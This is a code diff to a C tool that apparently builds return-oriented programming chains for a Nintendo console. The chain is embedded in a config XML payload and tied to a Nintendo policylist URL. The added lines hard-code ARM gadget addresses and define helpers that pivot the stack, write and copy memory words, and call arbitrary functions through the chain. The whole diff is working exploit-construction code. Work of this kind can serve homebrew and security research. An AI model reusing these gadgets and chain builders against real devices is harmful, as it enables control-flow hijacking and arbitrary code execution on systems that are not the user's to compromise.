@@ -26,9 +26,33 @@ char configxml_formatstr[] = {
 </config>\n\
 "};
 
+u32 ROP_POPR0R1R2R3R4R5R6PC = 0x001134d3;
+
+u32 ROP_POPR1R2R3PC = 0x00102341;
+
+u32 ROP_POPR2R3R4PC = 0x0010065d;
+
 u32 ROP_POPR4R5R67PC = 0x0012195f;
 
+u32 ROP_POPR4PC = 0x001000d1;
+
 u32 ROP_STACKPIVOT = 0x00142a64;//Add sp with r3 then pop-pc. 
+
+u32 ROP_POPPC;
+
+u32 ROP_LDRR0R1_BXR2 = 0x001022e5;//"ldr r0, [r1, #0]" "bx r2"
+
+u32 ROP_STRR0R1 = 0x001005e3;//"str r0, [r1, #0]" bx-lr
+
+u32 ROP_LDRR0SP0_POPR3PC = 0x0011538b;//"ldr r0, [sp, #0]" "pop {r3, pc}"
+
+u32 ROP_POPR3PC;
+
+u32 ROP_BLXR4_POPR1R2R3R4R5R6R7PC = 0x00103183;//"blx r4" "pop {r1, r2, r3, r4, r5, r6, r7, pc}"
+
+u32 ROP_MOVR1R0_BXLR = 0x0013b23d;//"mov r1, r0" "bx lr"
+
+u32 ROP_ADDR0R0R3_POPR2R3R4R5R6PC = 0x00104eb1;//"adds r0, r0, r3" "pop {r2, r3, r4, r5, r6, pc}"
 
 u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
 
@@ -83,6 +107,22 @@ void ropgen_addwords(u32 **ropchain, u32 *ropvaddr, u32 *buf, u32 total_words)
 	(*ropvaddr)+= total_words*4;
 }
 
+void ropgen_popr1r2r3pc(u32 **ropchain, u32 *ropvaddr, u32 r1, u32 r2, u32 r3)//Total size: 0x10-bytes.
+{
+	ropgen_addword(ropchain, ropvaddr, ROP_POPR1R2R3PC);
+	ropgen_addword(ropchain, ropvaddr, r1);
+	ropgen_addword(ropchain, ropvaddr, r2);
+	ropgen_addword(ropchain, ropvaddr, r3);
+}
+
+void ropgen_popr2r3r4pc(u32 **ropchain, u32 *ropvaddr, u32 r2, u32 r3, u32 r4)//Total size: 0x10-bytes.
+{
+	ropgen_addword(ropchain, ropvaddr, ROP_POPR2R3R4PC);
+	ropgen_addword(ropchain, ropvaddr, r2);
+	ropgen_addword(ropchain, ropvaddr, r3);
+	ropgen_addword(ropchain, ropvaddr, r4);
+}
+
 void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *ropvaddr, u32 r4, u32 r5, u32 r6, u32 r7)//Total size: 0x14-bytes.
 {
 	ropgen_addword(ropchain, ropvaddr, ROP_POPR4R5R67PC);
@@ -92,12 +132,105 @@ void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *ropvaddr, u32 r4, u32 r5, u32 r
 	ropgen_addword(ropchain, ropvaddr, r7);
 }
 
+void ropgen_popr0r1r2r3r4r5r6pc(u32 **ropchain, u32 *ropvaddr, u32 r0, u32 r1, u32 r2, u32 r3, u32 r4, u32 r5, u32 r6)//Total size: 0x20-bytes.
+{
+	ropgen_addword(ropchain, ropvaddr, ROP_POPR0R1R2R3R4R5R6PC);
+	ropgen_addword(ropchain, ropvaddr, r0);
+	ropgen_addword(ropchain, ropvaddr, r1);
+	ropgen_addword(ropchain, ropvaddr, r2);
+	ropgen_addword(ropchain, ropvaddr, r3);
+	ropgen_addword(ropchain, ropvaddr, r4);
+	ropgen_addword(ropchain, ropvaddr, r5);
+	ropgen_addword(ropchain, ropvaddr, r6);
+}
+
+void ropgen_popr3(u32 **ropchain, u32 *ropvaddr, u32 value)//Total size: 0x8-bytes.
+{
+	ropgen_addword(ropchain, ropvaddr, ROP_POPR3PC);
+	ropgen_addword(ropchain, ropvaddr, value);
+}
+
+void ropgen_setr0(u32 **ropchain, u32 *ropvaddr, u32 value)//Total size: 0x8-bytes.
+{
+	ropgen_addword(ropchain, ropvaddr, ROP_LDRR0SP0_POPR3PC);
+	ropgen_addword(ropchain, ropvaddr, value);
+}
+
+void ropgen_setr4(u32 **ropchain, u32 *ropvaddr, u32 value)//Total size: 0x8-bytes.
+{
+	ropgen_addword(ropchain, ropvaddr, ROP_POPR4PC);
+	ropgen_addword(ropchain, ropvaddr, value);
+}
+
+void ropgen_blxr4_popr1r2r3r4r5r6r7pc(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 *regs)//Total size: 0x28-bytes.
+{
+	ropgen_setr4(ropchain, ropvaddr, addr);
+
+	ropgen_addword(ropchain, ropvaddr, ROP_BLXR4_POPR1R2R3R4R5R6R7PC);
+
+	ropgen_addwords(ropchain, ropvaddr, regs, 7);
+}
+
+void ropgen_movr1r0(u32 **ropchain, u32 *ropvaddr)//Total size: 0x28-bytes.
+{
+	ropgen_blxr4_popr1r2r3r4r5r6r7pc(ropchain, ropvaddr, ROP_MOVR1R0_BXLR, NULL);
+}
+
+void ropgen_ldrr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Total size: 0x14-bytes.
+{
+	if(set_addr)
+	{
+		ropgen_popr1r2r3pc(ropchain, ropvaddr, addr, ROP_POPPC, 0);
+	}
+	else
+	{
+		ropgen_popr2r3r4pc(ropchain, ropvaddr, ROP_POPPC, 0, 0);
+	}
+
+	ropgen_addword(ropchain, ropvaddr, ROP_LDRR0R1_BXR2);
+}
+
+void ropgen_strr0r1(u32 **ropchain, u32 *ropvaddr, u32 addr, u32 set_addr)//Total size: 0x28-bytes + <0x10 if set_addr is set>.
+{
+	if(set_addr)ropgen_popr1r2r3pc(ropchain, ropvaddr, addr, 0, 0);
+
+	ropgen_blxr4_popr1r2r3r4r5r6r7pc(ropchain, ropvaddr, ROP_STRR0R1, NULL);
+}
+
+void ropgen_copyu32(u32 **ropchain, u32 *ropvaddr, u32 ldr_addr, u32 str_addr, u32 set_addr)//Total size: 0x3c + <0x10 if set_addr bit1 is set>.
+{
+	ropgen_ldrr0r1(ropchain, ropvaddr, ldr_addr, set_addr & 0x1);
+	ropgen_strr0r1(ropchain, ropvaddr, str_addr, set_addr & 0x2);
+}
+
+void ropgen_writeu32(u32 **ropchain, u32 *ropvaddr, u32 value, u32 addr, u32 set_addr)//Total size: 0x30-bytes + <0x10 if set_addr is set>.
+{
+	ropgen_setr0(ropchain, ropvaddr, value);
+	ropgen_strr0r1(ropchain, ropvaddr, addr, set_addr);
+}
+
+void ropgen_addr0r3_popr2r3r4r5r6(u32 **ropchain, u32 *ropvaddr, u32 value, u32 *regs)//Total size: 0x20-bytes.
+{
+	ropgen_popr3(ropchain, ropvaddr, value);
+
+	ropgen_addword(ropchain, ropvaddr, ROP_ADDR0R0R3_POPR2R3R4R5R6PC);
+
+	ropgen_addwords(ropchain, ropvaddr, regs, 5);
+}
+
 void ropgen_stackpivot(u32 **ropchain, u32 *ropvaddr, u32 addr)//Total size: 0x8-bytes.
 {
 	u32 ROP_STACKPIVOT_POPR3 = ROP_STACKPIVOT-4;//"pop {r3}", then the code from ROP_STACKPIVOT.
 
 	ropgen_addword(ropchain, ropvaddr, ROP_STACKPIVOT_POPR3);
 	ropgen_addword(ropchain, ropvaddr, addr - (*ropvaddr + 4));
+}
+
+void ropgen_callfunc(u32 **ropchain, u32 *ropvaddr, u32 funcaddr, u32 *params)//Total size: 0x48. Word-size of params is 11.
+{
+	ropgen_popr0r1r2r3r4r5r6pc(ropchain, ropvaddr, params[0], params[1], params[2], params[3], 0, 0, 0);
+
+	ropgen_blxr4_popr1r2r3r4r5r6r7pc(ropchain, ropvaddr, funcaddr, &params[4]);
 }
 
 void buildrop_config(u32 *ropchain, u32 ropchain_maxsize)
@@ -161,6 +294,9 @@ int main(int argc, char **argv)
 	fout = stdout;
 
 	url = "https://nppl.c.app.nintendowifi.net/p01/policylist/";
+
+	ROP_POPPC = ROP_STACKPIVOT+4;//"pop {pc}"
+	ROP_POPR3PC = ROP_LDRR0SP0_POPR3PC+0x2;
 
 	if(argc<3)
 	{
